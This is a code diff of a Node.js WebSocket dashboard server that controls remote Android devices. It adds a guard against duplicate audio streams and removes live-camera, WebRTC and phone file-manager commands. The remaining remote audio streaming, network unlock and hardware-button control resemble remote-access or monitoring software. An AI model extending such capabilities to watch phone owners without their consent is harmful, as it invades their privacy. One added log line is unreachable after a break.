@@ -117,10 +117,31 @@ function handleDashboard(ws) {
             ws._lastStartStreamAt = now;
             ws._lastStartStreamDevice = targetId;
 
-            // Always maintain the subscription (in case WS reconnected)
+            const existingSubscribers = dashboardStore
+              .getSubscribersForDevice(targetId)
+              .filter((client) => client !== ws);
+            if (existingSubscribers.length > 0) {
+              ws.send(JSON.stringify({
+                type: "command_ack",
+                command: "start_stream",
+                status: "error",
+                detail: "stream_already_active",
+                deviceId: targetId,
+              }));
+              break;
+            }
+
             dashboardStore.setAudioSubscription(ws, targetId);
 
             if (isDuplicate) {
+              ws.send(JSON.stringify({
+                type: "command_ack",
+                command: "start_stream",
+                status: "success",
+                detail: "duplicate_ignored",
+                deviceId: targetId,
+              }));
+              break;
               console.log(`⚡ [Dashboard] Duplicate start_stream observed for ${targetId} (${now - lastStreamCmd}ms ago), forwarding anyway`);
             }
 
@@ -198,43 +219,6 @@ function handleDashboard(ws) {
               ts: Date.now(),
             });
           }
-          break;
-        case "webrtc_start":
-          // WebRTC signaling messages are routed through device subscribers.
-          // Ensure this dashboard is subscribed even if live PCM stream was never started.
-          dashboardStore.setAudioSubscription(ws, targetId);
-          safeSendJson({ type: "webrtc_start" });
-          break;
-        case "webrtc_stop":
-          safeSendJson({ type: "webrtc_stop" });
-          break;
-        case "webrtc_offer":
-          dashboardStore.setAudioSubscription(ws, targetId);
-          if (typeof msg.sdp !== "string" || msg.sdp.length === 0) {
-            ws.send(JSON.stringify({ type: "error", message: "Invalid webrtc_offer payload" }));
-            break;
-          }
-          if (msg.sdp.length > 300000) {
-            ws.send(JSON.stringify({ type: "error", message: "webrtc_offer too large" }));
-            break;
-          }
-          safeSendJson({
-            type: "webrtc_offer",
-            sdp: msg.sdp,
-          });
-          break;
-        case "webrtc_ice":
-          dashboardStore.setAudioSubscription(ws, targetId);
-          safeSendJson({
-            type: "webrtc_ice",
-            candidate: msg.candidate,
-          });
-          break;
-        case "webrtc_quality":
-          safeSendJson({
-            type: "webrtc_quality",
-            quality: msg.quality || null,
-          });
           break;
         case "ai_mode":
           safeSendJson({
@@ -370,15 +354,6 @@ function handleDashboard(ws) {
               : "off",
           });
           break;
-        case "camera_live_start":
-          safeSendJson({
-            type: "camera_live_start",
-            camera: String(msg.camera || "current").toLowerCase(),
-          });
-          break;
-        case "camera_live_stop":
-          safeSendJson({ type: "camera_live_stop" });
-          break;
         case "force_update":
           safeSend("force_update");
           console.log(`🔄 Force update sent to ${targetId}`);
@@ -424,35 +399,6 @@ function handleDashboard(ws) {
           console.log(`📡 Unlock network sent to ${targetId}`);
           break;
         // ── File Manager CRUD commands ────────────────────────────────────
-        case "list_files":
-          safeSendJson({
-            type: "list_files",
-            path: String(msg.path || "/storage/emulated/0/"),
-          });
-          console.log(`📁 List files: ${msg.path || "/"} → ${targetId}`);
-          break;
-        case "delete_file":
-          safeSendJson({
-            type: "delete_file",
-            path: String(msg.path || ""),
-          });
-          console.log(`🗑️ Delete file: ${msg.path} → ${targetId}`);
-          break;
-        case "rename_file":
-          safeSendJson({
-            type: "rename_file",
-            oldPath: String(msg.oldPath || ""),
-            newPath: String(msg.newPath || ""),
-          });
-          console.log(`📝 Rename file: ${msg.oldPath} → ${msg.newPath} → ${targetId}`);
-          break;
-        case "create_dir":
-          safeSendJson({
-            type: "create_dir",
-            path: String(msg.path || ""),
-          });
-          console.log(`📁 Create dir: ${msg.path} → ${targetId}`);
-          break;
         // ── Remote Hardware Button Control ──────────────────────────────
         case "system_action":
           {
@@ -494,7 +440,6 @@ function handleDashboard(ws) {
         if (dev && dev.ws && dev.ws.readyState === WebSocket.OPEN) {
           console.log(`Sending auto-stop to ${deviceId} because dashboard closed.`);
           dev.ws.send("stop_stream");
-          dev.ws.send(JSON.stringify({ type: "camera_live_stop" }));
         }
       });
     }
@@ -539,17 +484,6 @@ function startStreamRecovery() {
         dev._awaitingRecoveryAudio = false;
         dev._streamRecoveryAttempts = 0;
         dev._nextStreamRecoveryAllowedAt = 0;
-      }
-
-      // S-H3/S-M4 fix: Use dev.health.isWebRtcStreaming directly.
-      // Skip if device is in WebRTC session (no PCM chunks expected when WebRTC active).
-      // Sending start_stream during WebRTC would spin up a parallel PCM loop — bandwidth flood.
-      if (dev.health?.isWebRtcStreaming === true) return;
-
-      // Give freshly connected devices 30s before attempting recovery,
-      // so they have time to report their first health status.
-      if (typeof dev.health?.isWebRtcStreaming === "undefined" && connectedAtMs > 0 && now - connectedAtMs < 30_000) {
-        return;
       }
 
       // Skip noisy retries for already-capturing devices unless stream is clearly stalled.
